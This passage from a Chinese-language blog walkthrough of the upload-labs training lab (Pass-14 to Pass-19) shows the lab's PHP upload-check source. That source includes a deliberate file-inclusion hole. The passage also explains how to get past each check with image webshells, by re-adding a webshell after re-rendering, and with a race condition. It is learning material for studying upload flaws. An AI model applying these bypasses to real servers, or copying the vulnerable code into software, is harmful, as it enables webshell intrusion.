href="https://www.cnblogs.com/Linkas/p/15101706.html">https://www.cnblogs.com/Linkas/p/15101706.html</a></p><p>开始尝试上传我们自己生成的图片马，然后获取文件名称和路径。</p><p>然后这个lab也是提供了一个文件包含漏洞，使我们可以使用我们上传的图片马。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">##include.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>利用get传递一个文件，注意路径，路径一定要填对。<br><img src="https://s2.loli.net/2022/02/09/uaANpDPqInLJ6dr.png"></p><h3 id="Pass-15-getimagesize-图片马"><a href="#Pass-15-getimagesize-图片马" class="headerlink" title="Pass-15-getimagesize()-图片马"></a>Pass-15-getimagesize()-图片马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = getimagesize(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = image_type_to_extension(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>getimagesize() 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型及图片高度与宽度。</p><p>此代码是type检测。</p><p>和上面同样的方式绕过。</p><h3 id="Pass-16-exif-imagetype-图片马"><a href="#Pass-16-exif-imagetype-图片马" class="headerlink" title="Pass-16-exif_imagetype()-图片马"></a>Pass-16-exif_imagetype()-图片马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    <span class="variable">$image_type</span> = exif_imagetype(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$image_type</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;gif&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;jpg&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;png&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = isImage(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;文件未知，上传失败！&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="https://www.php.net/manual/zh/function.exif-imagetype.php">exif-imagetype</a></p><p>同样是类型检测，和上面差不多。</p><h3 id="Pass-17-二次渲染绕过"><a href="#Pass-17-二次渲染绕过" class="headerlink" title="Pass-17-二次渲染绕过"></a>Pass-17-二次渲染绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.basename(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= substr(strrchr(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromjpeg(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagejpeg(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefrompng(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagepng(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = imagecreatefromgif(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                srand(time());</span><br><span class="line">                <span class="variable">$newfilename</span> = strval(rand()).<span class="string">&quot;.gif&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                imagegif(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @unlink(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>采用imagecreatefromgif生成了新的图片，删除了我们的一句话木马。</p><p>二次渲染原理： 在我们上传文件后，网站会对图片进行二次处理（格式、尺寸要求等），服务器会把里面的内容进行替换更新，处理完成后，根据我们原有的图片生成一个新的图片并放到网站对应的标签进行显示。</p><p>所以我们只需要再次将其生成的图片给下载下来，然后继续添加我们的webshell就行。</p><p>针对不同的图片类型，添加webshell的方式也不同，<a href="https://blog.csdn.net/weixin_45519736/article/details/105775721">https://blog.csdn.net/weixin_45519736/article/details/105775721</a><br>感觉还是gif比较好弄。</p><h3 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18-条件竞争"></a>Pass-18-条件竞争</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_ext</span> = substr(<span class="variable">$file_name</span>,strrpos(<span class="variable">$file_name</span>,<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$upload_file</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$upload_file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">             <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line">             rename(<span class="variable">$upload_file</span>, <span class="variable">$img_path</span>);</span><br><span class="line">             <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;</span><br><span class="line">            unlink(<span class="variable">$upload_file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>仔细阅读源码的话，会发现文件是先上传到了服务器，然后再检测是否满足指定后缀，如果满足，就重命名文件，不满足，就删除文件。</p><p>这时候，我们可以采用条件竞争完成文件上传的目的。实际上原理就是通过利用文件是先上传到了服务器，然后不断请求上传php一句话木马，相当于我们上传的php文件就会在某些时刻存在于服务器。</p><p>具体步骤，抓包，发送到Intruder。<br><img src="https://s2.loli.net/2022/02/09/IpbiOFKD5fh9u1q.png"><br>clear所有$。</p><p>设置请求次数，尽量设置偏大一点。<br><img src="https://s2.loli.net/2022/02/09/CSY96OclMvHnuWU.png"><br>开始攻击。</p><p>然后不断尝试访问该php文件。<br><img src="https://s2.loli.net/2022/02/09/epyOVvMXWP3l7D5.png"></p><h3 id="Pass-19-条件竞争"><a href="#Pass-19-条件竞争" class="headerlink" title="Pass-19-条件竞争"></a>Pass-19-条件竞争</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;./myupload.php&quot;</span>);</span><br><span class="line">    <span class="variable">$imgFileName</span> =time();</span><br><span class="line">    <span class="variable">$u</span> = <span class="keyword">new</span> MyUpload(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>],<span class="variable">$imgFileName</span>);</span><br><span class="line">    <span class="variable">$status_code</span> = <span class="variable">$u</span>-&gt;upload(UPLOAD_PATH);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$status_code</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            <span class="variable">$img_path</span> = <span class="variable">$u</span>-&gt;cls_upload_dir . <span class="variable">$u</span>-&gt;cls_file_rename_to;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件已经被上传，但没有重命名。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-1</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;这个文件不能上传到服务器的临时文件存储目录。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-2</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传目录不可写。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-3</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，无法上传该类型文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-4</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，上传的文件过大。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;上传失败，服务器已经存在相同名称文件。&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件无法上传，文件不能复制到目标目录。&#x27;</span>;</span><br><span class="line">            